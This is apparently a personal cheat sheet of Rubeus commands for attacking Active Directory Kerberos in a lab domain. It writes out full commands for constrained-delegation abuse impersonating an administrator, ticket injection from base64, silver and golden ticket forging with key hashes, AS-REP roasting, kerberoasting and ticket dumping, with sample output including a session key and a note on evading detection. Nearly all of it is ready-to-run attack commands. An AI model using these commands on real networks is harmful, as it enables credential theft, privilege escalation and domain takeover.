+++
date = '2026-09-08T22:00:58+09:00'
draft = false
title = 'Rubeus commands'
tags = ["rubeus"]
+++

# Constrained delegation

- For example, delegate to mssqlsvc/sql.domain.com:1433
- execute a command in the machine which has constrained delegation (in this example __LON-WS-1$__)
- impersonate a real user

```
userAccountControl: 16781312
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
```

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket: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 /impersonateuser:administrator /msdsspn:cifs/lon-fs-1 /nowrap /ptt
```

## without /ptt

manually create a **kirbi** file and inject.

```powershell
[IO.File]::WriteAllBytes("C:\Users\testuser\Desktop\mssvc.kirbi", [Convert]::FromBase64String("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"))
```

## with /altservice

- change SPN to **one of defined SPNs**
- Instead of mssqlsvc, create a cifs SPN ticket.
- check target machine's available SPNs with ldapsearch command `ldapsearch (samAccountType=805306369)`

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket: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 /impersonateuser:iappleton /msdsspn:mssqlsvc/sql.domain.com /altservice:cifs /ptt
```

# Silver Ticket

- need a target machine's hash or SPN hash

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

# Golden Ticket

- need a krbtgt of DC

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
```

# Forge a TGT

- need a target user's hash

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
```

# asreproast

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

# kerberoast

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
```

# ticket dump

It is OPSEC safe since this approach doesn't touch LSASS

## triage

- list tickets of login users
- high integrity token level needed

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x9ff74

 ------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                   | Service                               | EndTime             |
 ------------------------------------------------------------------------------------------------------- 
 | 0xd42c80 | rsteel @ CONTOSO.COM       | krbtgt/CONTOSO.COM                    | 17/02/2025 19:53:40 |
 | 0x692d8c | pchilds @ CONTOSO.COM      | krbtgt/CONTOSO.COM                    | 17/02/2025 20:07:34 |
 | 0x692d8c | pchilds @ CONTOSO.COM      | LDAP/lon-dc-1.contoso.com/contoso.com | 17/02/2025 20:07:34 |
 | 0x692d8c | pchilds @ CONTOSO.COM      | ldap/lon-dc-1.contoso.com             | 17/02/2025 20:07:34 |
 | 0x9ff74  | pchilds @ CONTOSO          | lon-wkstn-1$@CONTOSO.COM              | 17/02/2025 09:47:18 |
 | 0x8f294  | pchilds @ CONTOSO.COM      | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:11 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:09 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com             | 17/02/2025 19:32:09 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | GC/lon-dc-1.contoso.com/contoso.com   | 17/02/2025 19:32:09 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | ldap/lon-dc-1.contoso.com             | 17/02/2025 19:32:09 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | ldap/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:09 |
 | 0x3e4    | lon-wkstn-1$ @ CONTOSO.COM | DNS/lon-dc-1.contoso.com              | 17/02/2025 19:32:09 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | krbtgt/CONTOSO.COM                    | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | cifs/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LON-WKSTN-1$                          | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com             | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | LDAP/lon-dc-1.contoso.com/contoso.com | 17/02/2025 19:32:10 |
 | 0x3e7    | lon-wkstn-1$ @ CONTOSO.COM | lon-wkstn-1$@CONTOSO.COM              | 17/02/2025 09:47:18 |
 -------------------------------------------------------------------------------------------------------
```

## dump

- dump any tickets from the list
- also can pick a target with `/user:rsteel` instead of /luid.

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap

Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0xd42c80
[*] Current LUID    : 0x9ff74

  UserName                 : rsteel
  Domain                   : CONTOSO
  LogonId                  : 0xd42c80
  UserSID                  : S-1-5-21-3926355307-1661546229-813047887-1108
  AuthenticationPackage    : Kerberos
  LogonType                : Interactive
  LogonTime                : 17/02/2025 09:53:40
  LogonServer              : LON-DC-1
  LogonServerDNSDomain     : CONTOSO.COM
  UserPrincipalName        : rsteel@contoso.com

    ServiceName              :  krbtgt/CONTOSO.COM
    ServiceRealm             :  CONTOSO.COM
    UserName                 :  rsteel (NT_PRINCIPAL)
    UserRealm                :  CONTOSO.COM
    StartTime                :  17/02/2025 09:53:40
    EndTime                  :  17/02/2025 19:53:40
    RenewTill                :  24/02/2025 09:53:40
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  18ERntJqjw7kxyWcumyzU0uOzbjM3spuh9bMkV4OiKI=
    Base64EncodedTicket   :

      doIFm[...snip...]DT00=
```